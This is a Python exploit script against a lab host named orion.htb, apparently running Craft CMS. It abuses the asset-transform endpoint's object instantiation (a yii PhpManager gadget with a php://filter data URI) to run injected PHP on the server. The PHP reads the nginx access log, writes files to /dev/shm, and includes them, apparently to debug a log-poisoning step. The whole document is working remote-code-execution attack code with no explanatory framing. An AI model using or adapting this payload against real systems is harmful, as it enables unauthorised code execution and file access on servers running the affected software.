import requests, re, base64, time

HOST = 'http://orion.htb'

def inject_b64(php_code):
    b64 = base64.b64encode(php_code.encode()).decode()
    item_file = 'php://filter/read=convert.base64-decode/resource=data://text/plain;base64,' + b64
    s = requests.Session()
    s.get(f'{HOST}/index.php?p=admin/dashboard')
    r2 = s.get(f'{HOST}/index.php?p=admin/dashboard')
    m = re.search(r'csrfTokenValue":"([^"]+)"', r2.text)
    tok = m.group(1) if m else ''
    body = {"assetId":11,"handle":{"width":1,"height":1,"as session":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"yii\\rbac\\PhpManager","__construct()":[{"itemFile":item_file}]}}}
    headers = {'Content-Type':'application/json','X-CSRF-Token':tok}
    return s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform', json=body, headers=headers, timeout=15)

php = '<?php ' \
    '$f = file_get_contents("/var/log/nginx/access.log"); ' \
    '$len = strlen($f); ' \
    '$tags = []; ' \
    '$pos = 0; ' \
    'while (($pos = strpos($f, "<?", $pos)) !== false) { ' \
    '  $tags[] = $pos; ' \
    '  $pos++; ' \
    '}' \
    '$out = "ACCESS_LOG_ANALYSIS\\n"; ' \
    '$out .= "length=$len\\n"; ' \
    '$out .= "php_tag_count=" . count($tags) . "\\n"; ' \
    'foreach ($tags as $i => $p) { ' \
    '  $out .= "tag#$i at $p: " . substr($f, $p, 80) . "\\n"; ' \
    '}' \
    '$lines = explode("\\n", $f); ' \
    '$out .= "\\nLines around 160:\\n"; ' \
    'foreach (range(max(0, 155), min(count($lines)-1, 165)) as $i) { ' \
    '  $out .= "line " . ($i+1) . ": " . $lines[$i] . "\\n"; ' \
    '}' \
    '$out .= "\\nBytes at position 24000-24100:\\n"; ' \
    '$out .= substr($f, 24000, 100) . "\\n"; ' \
    'file_put_contents("/dev/shm/access_analysis.txt", $out); '

print("[*] Analyzing access.log ...")
r = inject_b64(php)
print(f"    Status: {r.status_code}")
time.sleep(1)

php2 = '<?php ' \
    '$analysis = @file_get_contents("/dev/shm/access_analysis.txt") ?: "NOFILE"; ' \
    '$padding = str_repeat("LINETEXT\\n", 2000); ' \
    '$content = $padding . "<?php echo UNDEFINED_CONSTANT_X; ?>\\n" . $analysis; ' \
    'file_put_contents("/dev/shm/exact_flush.php", $content); '

print("[*] Building exact copy ...")
r = inject_b64(php2)
print(f"    Status: {r.status_code}")
time.sleep(1)

print("[*] Including exact_flush.php ...")
s = requests.Session()
s.get(f'{HOST}/index.php?p=admin/dashboard')
r2 = s.get(f'{HOST}/index.php?p=admin/dashboard')
m = re.search(r'csrfTokenValue":"([^"]+)"', r2.text)
tok = m.group(1) if m else ''
body = {"assetId":11,"handle":{"width":1,"height":1,"as session":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"yii\\rbac\\PhpManager","__construct()":[{"itemFile":"/dev/shm/exact_flush.php"}]}}}
headers = {'Content-Type':'application/json','X-CSRF-Token':tok}
r3 = s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform', json=body, headers=headers, timeout=30)

print(f"    Status: {r3.status_code}, Len: {len(r3.text)}")
t = r3.text

for kw in ['LINETEXT', 'ACCESS_LOG_ANALYSIS', 'UNDEFINED_CONSTANT_X', 'php_tag_count', 'length='] + [f'tag#{i}' for i in range(5)]:
    if kw in t:
        idx = t.index(kw)
        print(f'[+] "{kw}" at byte {idx}: {t[idx:idx+200]}')

print(f'\nFirst 300: {t[:300]}')
print(f'\nLast 600: {t[-600:]}')
